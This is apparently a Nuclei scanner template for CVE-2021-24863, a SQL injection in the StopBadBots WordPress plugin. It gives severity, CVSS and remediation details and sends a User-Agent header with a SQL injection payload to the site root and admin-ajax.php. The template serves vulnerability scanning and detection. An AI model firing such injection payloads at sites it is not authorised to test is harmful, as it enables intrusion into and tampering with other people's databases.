id: CVE-2021-24863

info:
  name: SQL Injection in StopBadBots WordPress Plugin
  author: ProjectDiscoveryAI
  severity: critical
  description: The WP Block and Stop Bad Bots Crawlers and Spiders and Anti Spam Protection Plugin StopBadBots WordPress plugin before 6.67 does not sanitise and escape the User Agent before using it in a SQL statement to save it, leading to a SQL injection.
  impact: |
    Allows attackers to execute malicious SQL queries, potentially leading to data theft or manipulation.
  remediation: |
    Update StopBadBots WordPress Plugin to the latest patched version to mitigate the SQL Injection vulnerability (CVE-2021-24863).
  reference:
    - https://wpscan.com/vulnerability/1e4dd002-6c96-44f9-bd55-61359265f7ae
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24863
    cwe-id: CWE-89
    epss-score: 0.00198
    epss-percentile: 0.58525
    cpe: cpe:2.3:a:stopbadbots:block_and_stop_bad_bots:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: stopbadbots
    product: block_and_stop_bad_bots
    framework: wordpress
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      User-Agent: "Zongbot' where id = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'-- -"
    matchers:
      - type: status
        status:
          - 200
